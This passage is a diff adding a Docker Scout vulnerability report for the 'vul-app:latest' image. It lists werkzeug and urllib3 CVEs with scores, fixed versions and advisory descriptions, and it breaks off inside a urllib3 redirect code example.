@@ -1,0 +1,1605 @@
+<html>
+
+<body>
+
+<h2>:mag: Vulnerabilities of <code>vul-app:latest</code></h2>
+
+<details open="true"><summary>:package: Image Reference</strong> <code>vul-app:latest</code></summary>
+<table>
+<tr><td>digest</td><td><code>sha256:4604dc6961a40c6cc8492e7e16ed2d36d8ab49bd708a2a0404ab7e7a45dfb9d3</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 1" src="https://img.shields.io/badge/critical-1-8b1924"/> <img alt="high: 12" src="https://img.shields.io/badge/high-12-e25d68"/> <img alt="medium: 23" src="https://img.shields.io/badge/medium-23-fbb552"/> <img alt="low: 8" src="https://img.shields.io/badge/low-8-fce1a9"/> <img alt="unspecified: 8" src="https://img.shields.io/badge/unspecified-8-lightgrey"/></td></tr>
+<tr><td>platform</td><td>linux/amd64</td></tr>
+<tr><td>size</td><td>386 MB</td></tr>
+<tr><td>packages</td><td>588</td></tr>
+</table>
+</details></table>
+</details>
+
+<table>
+<tr><td valign="top">
+<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 6" src="https://img.shields.io/badge/M-6-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>werkzeug</strong> <code>2.0.0</code> (pypi)</summary>
+
+<small><code>pkg:pypi/werkzeug@2.0.0</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2022-29361?s=pypa&n=werkzeug&t=pypi&vr=%3C2.1.1"><img alt="critical : CVE--2022--29361" src="https://img.shields.io/badge/CVE--2022--29361-lightgrey?label=critical%20&labelColor=8b1924"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code><2.1.1</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.1.1</code></td></tr>
+<tr><td>EPSS Score</td><td><code>31.113%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>97th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+** DISPUTED ** Improper parsing of HTTP requests in Pallets Werkzeug v2.1.0 and below allows attackers to perform HTTP Request Smuggling using a crafted HTTP request with multiple requests included inside the body. NOTE: the vendor's position is that this behavior can only occur in unsupported configurations involving development mode and an HTTP server from outside the Werkzeug project.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-34069?s=github&n=werkzeug&t=pypi&vr=%3C3.0.3"><img alt="high 7.5: CVE--2024--34069" src="https://img.shields.io/badge/CVE--2024--34069-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Cross-Site Request Forgery (CSRF)</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.0.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.0.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>38.929%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>97th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-25577?s=github&n=werkzeug&t=pypi&vr=%3C2.2.3"><img alt="high 7.5: CVE--2023--25577" src="https://img.shields.io/badge/CVE--2023--25577-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.2.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.2.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.366%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Werkzeug's multipart form data parser will parse an unlimited number of parts, including file parts. Parts can be a small amount of bytes, but each requires CPU time to parse and may use more memory as Python data. If a request can be made to an endpoint that accesses `request.data`, `request.form`, `request.files`, or `request.get_data(parse_form_data=False)`, it can cause unexpectedly high resource usage.
+
+This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. Unlimited file parts can use up memory and file handles. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-49767?s=github&n=werkzeug&t=pypi&vr=%3C%3D3.0.5"><img alt="medium 6.9: CVE--2024--49767" src="https://img.shields.io/badge/CVE--2024--49767-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>
+
+<table>
+<tr><td>Affected range</td><td><code><=3.0.5</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.0.6</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>1.090%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Applications using Werkzeug to parse `multipart/form-data` requests are vulnerable to resource exhaustion. A specially crafted form body can bypass the `Request.max_form_memory_size` setting.
+
+
+The `Request.max_content_length` setting, as well as resource limits provided by deployment software and platforms, are also available to limit the resources used during a request. This vulnerability does not affect those settings. All three types of limits should be considered and set appropriately when deploying an application.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2026-27199?s=github&n=werkzeug&t=pypi&vr=%3C3.1.6"><img alt="medium 6.3: CVE--2026--27199" src="https://img.shields.io/badge/CVE--2026--27199-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.1.6</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.6</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Werkzeug's `safe_join` function allows Windows device names as filenames if when preceded by other path segments.
+
+This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact that `safe_join` accepts paths with multiple segments, such as `example/NUL`.
+
+`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2026-21860?s=github&n=werkzeug&t=pypi&vr=%3C3.1.5"><img alt="medium 6.3: CVE--2026--21860" src="https://img.shields.io/badge/CVE--2026--21860-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.1.5</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.5</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.
+
+This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.
+
+`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2025-66221?s=github&n=werkzeug&t=pypi&vr=%3C3.1.4"><img alt="medium 6.3: CVE--2025--66221" src="https://img.shields.io/badge/CVE--2025--66221-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.1.4</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.4</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-49766?s=github&n=werkzeug&t=pypi&vr=%3C%3D3.0.5"><img alt="medium 6.3: CVE--2024--49766" src="https://img.shields.io/badge/CVE--2024--49766-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><=3.0.5</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.0.6</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>1.392%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+On Python < 3.11 on Windows, `os.path.isabs()` does not catch UNC paths like `//server/share`. Werkzeug's `safe_join()` relies on this check, and so can produce a path that is not safe, potentially allowing unintended access to data. Applications using Python >= 3.11, or not using Windows, are not vulnerable.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-46136?s=github&n=werkzeug&t=pypi&vr=%3C2.3.8"><img alt="medium 5.7: CVE--2023--46136" src="https://img.shields.io/badge/CVE--2023--46136-lightgrey?label=medium%205.7&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.3.8</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.3.8</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.7</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.555%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.
+
+This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.
+
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-23934?s=github&n=werkzeug&t=pypi&vr=%3C2.2.3"><img alt="low 2.6: CVE--2023--23934" src="https://img.shields.io/badge/CVE--2023--23934-lightgrey?label=low%202.6&labelColor=fce1a9"/></a> <i>Improper Input Validation</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.2.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.2.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>2.6</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.267%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Browsers may allow "nameless" cookies that look like `=value` instead of `key=value`. A vulnerable browser may allow a compromised application on an adjacent subdomain to exploit this to set a cookie like `=__Host-test=bad` for another subdomain.
+
+Werkzeug <= 2.2.2 will parse the cookie `=__Host-test=bad` as `__Host-test=bad`. If a Werkzeug application is running next to a vulnerable or malicious subdomain which sets such a cookie using a vulnerable browser, the Werkzeug application will see the bad cookie value but the valid cookie key.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 5" src="https://img.shields.io/badge/H-5-e25d68"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>urllib3</strong> <code>1.26.0</code> (pypi)</summary>
+
+<small><code>pkg:pypi/urllib3@1.26.0</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2026-21441?s=github&n=urllib3&t=pypi&vr=%3E%3D1.22%2C%3C2.6.3"><img alt="high 8.9: CVE--2026--21441" src="https://img.shields.io/badge/CVE--2026--21441-lightgrey?label=high%208.9&labelColor=e25d68"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=1.22<br/><2.6.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.6.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>8.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+
+urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.
+
+urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.
+
+However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).
+
+### Affected usages
+
+Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.
+
+
+### Remediation
+
+Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.
+
+If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2025-66471?s=github&n=urllib3&t=pypi&vr=%3E%3D1.0%2C%3C2.6.0"><img alt="high 8.9: CVE--2025--66471" src="https://img.shields.io/badge/CVE--2025--66471-lightgrey?label=high%208.9&labelColor=e25d68"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=1.0<br/><2.6.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.6.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>8.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+
+urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.
+
+When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.
+
+The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.
+
+
+### Affected usages
+
+Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.
+
+`stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.
+
+
+### Remediation
+
+Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.
+
+If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.
+
+
+### Credits
+
+The issue was reported by @Cycloctane.
+Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/).
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2025-66418?s=github&n=urllib3&t=pypi&vr=%3E%3D1.24%2C%3C2.6.0"><img alt="high 8.9: CVE--2025--66418" src="https://img.shields.io/badge/CVE--2025--66418-lightgrey?label=high%208.9&labelColor=e25d68"/></a> <i>Allocation of Resources Without Limits or Throttling</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=1.24<br/><2.6.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.6.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>8.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+## Impact
+
+urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).
+
+However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.
+
+
+## Affected usages
+
+Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.
+
+
+## Remediation
+
+Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.
+
+If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers["content-encoding"]` contains a safe number of encodings before reading the response content.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2021-33503?s=github&n=urllib3&t=pypi&vr=%3E%3D1.25.4%2C%3C1.26.5"><img alt="high 8.7: CVE--2021--33503" src="https://img.shields.io/badge/CVE--2021--33503-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=1.25.4<br/><1.26.5</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.26.5</code></td></tr>
+<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.863%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+
+When provided with a URL containing many `@` characters in the authority component the authority regular expression exhibits catastrophic backtracking causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redirect.
+
+
+### Patches
+
+The issue has been fixed in urllib3 v1.26.5.
+
+### References
+
+- [CVE-2021-33503](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33503)
+- [JVNVU#92413403 (English)](https://jvn.jp/en/vu/JVNVU92413403/)
+- [JVNVU#92413403 (Japanese)](https://jvn.jp/vu/JVNVU92413403/)
+- [urllib3 v1.26.5](https://github.com/urllib3/urllib3/releases/tag/1.26.5)
+
+### For more information
+If you have any questions or comments about this advisory:
+* Ask in our [community Discord](https://discord.gg/urllib3)
+* Email [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com)
+
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-43804?s=github&n=urllib3&t=pypi&vr=%3C1.26.17"><img alt="high 7.4: CVE--2023--43804" src="https://img.shields.io/badge/CVE--2023--43804-lightgrey?label=high%207.4&labelColor=e25d68"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>
+
+<table>
+<tr><td>Affected range</td><td><code><1.26.17</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.26.17</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.867%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly.
+
+Users **must** handle redirects themselves instead of relying on urllib3's automatic redirects to achieve safe processing of the `Cookie` header, thus we decided to strip the header by default in order to further protect users who aren't using the correct approach.
+
+## Affected usages
+
+We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:
+
+* Using an affected version of urllib3 (patched in v1.26.17 and v2.0.6)
+* Using the `Cookie` header on requests, which is mostly typical for impersonating a browser.
+* Not disabling HTTP redirects
+* Either not using HTTPS or for the origin server to redirect to a malicious origin.
+
+## Remediation
+
+* Upgrading to at least urllib3 v1.26.17 or v2.0.6
+* Disabling HTTP redirects using `redirects=False` when sending requests.
+* Not using the `Cookie` header.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2021-28363?s=github&n=urllib3&t=pypi&vr=%3E%3D1.26.0%2C%3C1.26.4"><img alt="medium 6.9: CVE--2021--28363" src="https://img.shields.io/badge/CVE--2021--28363-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Improper Certificate Validation</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=1.26.0<br/><1.26.4</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.26.4</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.107%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+
+Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via `proxy_config`.
+Only the default SSLContext is impacted.
+
+### Patches
+
+[urllib3 >=1.26.4 has the issue resolved](https://github.com/urllib3/urllib3/releases/tag/1.26.4). urllib3<1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.
+
+### Workarounds
+
+Upgrading is recommended as this is a minor release and not likely to break current usage.
+
+Configuring an `SSLContext` with `check_hostname=True` and passing via `proxy_config` instead of relying on the default `SSLContext`
+
+### For more information
+If you have any questions or comments about this advisory:
+* Email us at [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com)
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-45803?s=github&n=urllib3&t=pypi&vr=%3C1.26.18"><img alt="medium 5.7: CVE--2023--45803" src="https://img.shields.io/badge/CVE--2023--45803-lightgrey?label=medium%205.7&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>
+
+<table>
+<tr><td>Affected range</td><td><code><1.26.18</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.26.18</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.7</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:A/AC:L/AT:P/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.051%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 303 "See Other" after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.
+
+From [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):
+
+> A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.
+
+## Affected usages
+
+Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.
+
+Both of the following conditions must be true to be affected by this vulnerability:
+
+* If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)
+* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.
+
+## Remediation
+
+You can remediate this vulnerability with any of the following steps:
+
+* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)
+* Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`.
+* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2025-50181?s=github&n=urllib3&t=pypi&vr=%3C2.5.0"><img alt="medium 5.3: CVE--2025--50181" src="https://img.shields.io/badge/CVE--2025--50181-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>URL Redirection to Untrusted Site ('Open Redirect')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.5.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.5.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:
+
+```python
+resp = urllib3.request("GET", "https://httpbin.org/redirect/1", redirect=False)
+print(resp.status)
+# 302
+```
+
+However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:
+
+```python
+import urllib3
+
+http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect
